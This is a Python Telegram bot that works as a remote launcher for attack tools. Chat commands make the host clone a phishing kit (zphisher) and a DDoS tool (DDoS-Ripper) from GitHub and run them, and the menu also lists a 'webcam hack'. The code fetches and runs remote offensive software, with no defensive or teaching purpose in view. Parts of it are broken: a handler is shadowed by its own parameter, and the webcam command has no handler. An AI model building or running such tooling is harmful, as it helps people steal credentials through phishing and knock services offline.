import os
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext
import subprocess

# Define bot token
TELEGRAM_API_TOKEN = 'YOUR_BOT_API_TOKEN'

# Define the commands

def start(update: Update, context: CallbackContext) -> None:
    update.message.reply_text(
        "Welcome! Choose an option:\n"
        "/update - Install updates\n"
        "/phishing - Install phishing tool\n"
        "/webcam - Install webcam hack\n"
        "/ddos - Install DDOS tool\n"
        "/help - Show available commands"
    )

def update(update: Update, context: CallbackContext) -> None:
    update.message.reply_text("Installing updates and requirements...")
    subprocess.run(["pkg", "install", "git", "python", "python3", "pip", "pip3", "curl", "-y"])
    subprocess.run(["apt", "update", "-y"])
    subprocess.run(["apt", "upgrade", "-y"])
    update.message.reply_text("Updates installed successfully.")

def phishing(update: Update, context: CallbackContext) -> None:
    update.message.reply_text("Installing phishing tool...")
    subprocess.run(["git", "clone", "https://github.com/htr-tech/zphisher"])
    subprocess.run(["bash", "zphisher.sh"])
    update.message.reply_text("Phishing tool installed successfully.")

def ddos(update: Update, context: CallbackContext) -> None:
    update.message.reply_text("Installing DDOS tool...")
    subprocess.run(["git", "clone", "https://github.com/palahsu/DDoS-Ripper.git"])
    subprocess.run(["python3", "DRipper.py"])
    update.message.reply_text("DDOS tool installed successfully.")

def help(update: Update, context: CallbackContext) -> None:
    update.message.reply_text(
        "Available commands:\n"
        "/start - Show the main menu\n"
        "/update - Install updates\n"
        "/phishing - Install phishing tool\n"
        "/webcam - Install webcam hack\n"
        "/ddos - Install DDOS tool"
    )

def main() -> None:
    updater = Updater(TELEGRAM_API_TOKEN)

    dispatcher = updater.dispatcher
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("update", update))
    dispatcher.add_handler(CommandHandler("phishing", phishing))
    dispatcher.add_handler(CommandHandler("ddos", ddos))
    dispatcher.add_handler(CommandHandler("help", help))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
